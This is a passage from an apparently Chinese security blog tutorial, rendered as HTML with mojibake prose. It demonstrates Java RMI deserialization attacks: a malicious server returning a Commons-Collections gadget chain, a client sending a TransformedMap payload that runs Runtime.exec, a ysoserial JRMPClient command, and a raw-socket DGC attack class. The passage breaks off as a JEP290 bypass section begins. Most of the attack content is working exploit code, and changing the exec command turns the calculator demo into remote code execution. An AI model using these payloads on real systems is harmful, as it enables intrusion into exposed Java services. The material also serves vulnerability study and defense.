<span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="number">1099</span>);</span><br><span class="line">        registry.lookup(<span class="string">&quot;ttt&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åœ¨å®¢æˆ·ç«¯ä¸‹æ–­ç‚¹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733232920806-8fc9713f-fd3a-4491-92ec-6e28a12561ce.png"><br>è·Ÿè¿›å»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733232972828-6e421865-a276-4837-ac13-fa599e9dd79a.png"></p><p>è·Ÿè¿›å»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733232993864-7b9fbc26-fd66-4890-95d9-dbb6aac38ba0.png"></p><p>è¿™é‡Œæ˜¯è§¦å‘ç‚¹ï¼Œä¹Ÿå°±æ˜¯å½“æ—¶åˆ†æçš„ååºåˆ—åŒ–2ã€‚listæ–¹æ³•ä¹Ÿæ˜¯ä¸€æ ·</p><h4 id="æœåŠ¡ç«¯æ”»å‡»å®¢æˆ·ç«¯"><a href="#æœåŠ¡ç«¯æ”»å‡»å®¢æˆ·ç«¯" class="headerlink" title="æœåŠ¡ç«¯æ”»å‡»å®¢æˆ·ç«¯"></a>æœåŠ¡ç«¯æ”»å‡»å®¢æˆ·ç«¯</h4><p>æ¶æ„æœåŠ¡ç«¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IRemoteObj</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    String <span class="title function_">test</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">RmiDemo</span><span class="params">()</span> <span class="keyword">throws</span> Exception;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IRemoteObjImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">IRemoteObj</span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">IRemoteObjImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">RmiDemo</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">innermap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.commons.collections.map.LazyMap&quot;</span>);</span><br><span class="line">        Constructor[] constructors = clazz.getDeclaredConstructors();</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> constructors[<span class="number">0</span>];</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> (Map) constructor.newInstance(innermap, chain);</span><br><span class="line"></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">handler_constructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        handler_constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">map_handler</span> <span class="operator">=</span> (InvocationHandler) handler_constructor.newInstance(Override.class, map); <span class="comment">//åˆ›å»ºç¬¬ä¸€ä¸ªä»£ç†çš„handler</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxy_map</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, map_handler); <span class="comment">//åˆ›å»ºproxyå¯¹è±¡</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">AnnotationInvocationHandler_Constructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        AnnotationInvocationHandler_Constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> AnnotationInvocationHandler_Constructor.newInstance(Override.class, proxy_map);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å—å®³ç«¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="number">1099</span>);</span><br><span class="line">        String[] list = registry.list();</span><br><span class="line">        <span class="keyword">for</span> (String i : list) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;å·²ç»æ³¨å†Œçš„æœåŠ¡ï¼š&quot;</span> + i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">IRemoteObj</span> <span class="variable">rmiDemo</span> <span class="operator">=</span> (IRemoteObj)registry.lookup(<span class="string">&quot;RmiDemo&quot;</span>);</span><br><span class="line">        rmiDemo.RmiDemo();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è®°å¾—åœ¨å—å®³ç«¯ä¹Ÿå®šä¹‰ä¸€ä¸‹æ¥å£</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IRemoteObj</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    String <span class="title function_">test</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">RmiDemo</span><span class="params">()</span> <span class="keyword">throws</span> Exception;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªä¹Ÿæ˜¯ä¼šè°ƒç”¨invokeæ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733235052452-d3964947-c6d8-43c9-8329-0f2e17aeaa37.png"></p><p>è·Ÿè¿›å»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733235062325-0988d18c-2b60-4f6d-af53-e1cb1fba03a7.png"></p><p>è·Ÿè¿›å»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733235077577-e5e0c46d-c300-49d2-9087-c6725512f730.png"></p><p>æœ€åæ¥åˆ°unmarshavalueæ–¹æ³•è·Ÿè¿›å»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733235104366-b133adee-1bcb-478b-819e-d556ee46aaca.png"></p><p>å› ä¸ºæˆ‘ä»¬æœåŠ¡ç«¯è¿”å›çš„æ˜¯obejctæ‰€ä»¥ä¼šèµ°åˆ°elseé‡Œé¢è¿›è¡Œååºåˆ—åŒ–å’Œä¸Šæ–‡æ‰€è¯´çš„ååºåˆ—åŒ–5ä¸€æ ·</p><h3 id="æ”»å‡»æœåŠ¡ç«¯"><a href="#æ”»å‡»æœåŠ¡ç«¯" class="headerlink" title="æ”»å‡»æœåŠ¡ç«¯"></a>æ”»å‡»æœåŠ¡ç«¯</h3><h4 id="å®¢æˆ·ç«¯æ”»å‡»æœåŠ¡ç«¯"><a href="#å®¢æˆ·ç«¯æ”»å‡»æœåŠ¡ç«¯" class="headerlink" title="å®¢æˆ·ç«¯æ”»å‡»æœåŠ¡ç«¯"></a>å®¢æˆ·ç«¯æ”»å‡»æœåŠ¡ç«¯</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        <span class="comment">// ä»Registryä¸­æ£€ç´¢è¿œç¨‹å¯¹è±¡çš„å­˜æ ¹/ä»£ç†</span></span><br><span class="line">        <span class="type">IRemoteObj</span> <span class="variable">remoteQing</span> <span class="operator">=</span> (IRemoteObj) registry.lookup(<span class="string">&quot;remote&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> remoteQing.RmiDemo(payload());</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">payload</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"> </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"> </span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"> </span><br><span class="line">        Class&lt;?&gt; c = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; annotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> annotationInvocationHandlerConstructor.newInstance(Target.class, transformedMap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°±æ˜¯è¦æ±‚æœåŠ¡ç«¯è¦æœ‰ä¸€ä¸ªæ¥å—å®¢æˆ·ç«¯ä¼ æ¥çš„å¯¹è±¡ã€‚å°±ä¸å†è¯¦ç»†è·Ÿäº†å’Œååºåˆ—åŒ–7ä¸€æ ·</p><h3 id="DGCæ”»å‡»"><a href="#DGCæ”»å‡»" class="headerlink" title="DGCæ”»å‡»"></a>DGCæ”»å‡»</h3><p>è¿™é‡Œä½¿ç”¨ysoå·¥å…·æ”»å‡»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-all.jar ysoserial.exploit.JRMPClient <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">1099</span>  CommonsCollections6 <span class="string">&quot;open -a Calculator&quot;</span></span><br></pre></td></tr></table></figure><p>å—å®³æœåŠ¡ç«¯ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="type">IRemoteObj</span> <span class="variable">iRemoteObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IRemoteObjImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        registry.bind(<span class="string">&quot;RmiDemo&quot;</span>,iRemoteObj);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733243208736-36ef428c-09cd-40b9-ab00-1148145203ec.png"></p><p>å…¶å®èƒ½å¤Ÿçœ‹åˆ°ä»–ä¼šè¿›å…¥DGCImpl_Skelçš„dispatchæ–¹æ³•ä¸­ç„¶åè§¦å‘ååºåˆ—åŒ–</p><p>å †æ ˆ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733243390142-c75bc6ea-3b52-4b40-8c57-534439121d69.png"></p><p>ç›´æ¥é€šè¿‡socketå‘æ³¨å†Œä¸­å¿ƒå‘é€åºåˆ—åŒ–æ•°æ®</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sun.rmi.server.MarshalOutputStream;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.TransportConstants;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.DataOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteUtils</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">sendRawCall</span><span class="params">(String host, <span class="type">int</span> port, ObjID objid, <span class="type">int</span> opNum, Long hash, Object ...objects)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Socket</span> <span class="variable">socket</span> <span class="operator">=</span> SocketFactory.getDefault().createSocket(host, port);</span><br><span class="line">        socket.setKeepAlive(<span class="literal">true</span>);</span><br><span class="line">        socket.setTcpNoDelay(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">DataOutputStream</span> <span class="variable">dos</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">OutputStream</span> <span class="variable">os</span> <span class="operator">=</span> socket.getOutputStream();</span><br><span class="line">            dos = <span class="keyword">new</span> <span class="title class_">DataOutputStream</span>(os);</span><br><span class="line"></span><br><span class="line">            dos.writeInt(TransportConstants.Magic);</span><br><span class="line">            dos.writeShort(TransportConstants.Version);</span><br><span class="line">            dos.writeByte(TransportConstants.SingleOpProtocol);</span><br><span class="line">            dos.write(TransportConstants.Call);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">final</span> <span class="type">ObjectOutputStream</span> <span class="variable">objOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MarshalOutputStream</span>(dos);</span><br><span class="line"></span><br><span class="line">            objid.write(objOut); <span class="comment">//Objid</span></span><br><span class="line">            objOut.writeInt(opNum); <span class="comment">// opnum</span></span><br><span class="line">            objOut.writeLong(hash); <span class="comment">// hash</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (Object object:</span><br><span class="line">                    objects) &#123;</span><br><span class="line">                objOut.writeObject(object);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            os.flush();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (dos != <span class="literal">null</span>) &#123;</span><br><span class="line">                dos.close();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (socket != <span class="literal">null</span>) &#123;</span><br><span class="line">                socket.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Attack</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">AttackByDGC</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">registryHost</span> <span class="operator">=</span> <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">registryPort</span> <span class="operator">=</span> <span class="number">1099</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">payloadObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CC6</span>().getPocObject(<span class="string">&quot;mate-calc&quot;</span>);</span><br><span class="line">        <span class="type">ObjID</span> <span class="variable">objID</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="number">2</span>);</span><br><span class="line">        RemoteUtils.sendRawCall(registryHost, registryPort,  objID, <span class="number">0</span>, -<span class="number">669196253586618813L</span>,payloadObject);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        AttackByDGC();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…·ä½“è°ƒç”¨è°ƒè¯•æµç¨‹å¯ä»¥å‚è€ƒï¼š<a href="https://xz.aliyun.com/t/7930?time__1311=n4+xnD0DyDu730KK40Hpn7DOn=i=i3eH4D#toc-10">https://xz.aliyun.com/t/7930?time__1311&#x3D;n4%2BxnD0DyDu730KK40Hpn7DOn%3Di%3Di3eH4D#toc-10</a></p><h3 id="JEP290-Bypass"><a href="#JEP290-Bypass" class="headerlink" title="JEP290 Bypass"></a>JEP290 Bypass</h3><h4 id="jdkç‰ˆæœ¬"><a href="#jdkç‰ˆæœ¬" class="headerlink" title="jdkç‰ˆæœ¬&lt;231"></a>jdkç‰ˆæœ¬&lt;231</h4><p>å—å®³æœåŠ¡ç«¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span 